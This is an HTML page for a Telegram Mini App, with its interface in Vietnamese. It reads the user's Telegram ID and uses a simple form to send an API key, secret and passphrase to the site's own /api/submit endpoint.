<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Telegram WebApp</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: sans-serif;
      padding: 20px;
      background: orange;
    }
    input, button {
      font-size: 18px;
      padding: 10px;
      margin-bottom: 10px;
      width: 100%;
      box-sizing: border-box;
    }
  </style>
</head>
<body>

<h2 id="status">Đang xử lý...</h2>

<p>API KEY</p>
<input type="text" id="apikeyInput" placeholder="APIKEY" />
<p>SECRET</p>
<input type="text" id="secretInput" placeholder="SECRET" />
<p>PASSHARE</p>
<input type="text" id="passInput" placeholder="PASSSHARE" />
<button onclick="submitInfo()">Gửi</button>
<div id="loading" style="display:none;">Đang gửi...</div>

<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
  let userId = null;

  async function init() {
    const status = document.getElementById('status');
    try {
      const telegramUser = window.Telegram.WebApp.initDataUnsafe.user;
      if (!telegramUser || !telegramUser.id) {
        status.innerText = "Không lấy được Telegram ID.";
        return;
      }

      userId = telegramUser.id;
      status.innerText = "ID: " + userId;
    } catch (err) {
      console.error(err);
      status.innerText = "Có lỗi xảy ra.";
    }
  }

  async function submitInfo() {
    const apikey = document.getElementById('apikeyInput').value.trim();
    const secret = document.getElementById('secretInput').value.trim();
    const pass = document.getElementById('passInput').value.trim();
    const loading = document.getElementById('loading');

    if (!userId) return alert("Không có userId Telegram.");
    if (!apikey || !secret || !pass) return alert("Vui lòng nhập đầy đủ thông tin.");

    loading.style.display = 'block';

    try {
      const res = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, apikey, secret, pass })
      });

      const data = await res.json();
      alert("Đã gửi thành công!");
    } catch (err) {
      alert('Lỗi gửi dữ liệu!');
      console.error(err);
    } finally {
      loading.style.display = 'none';
    }
  }

  init();
</script>

</body>
</html>
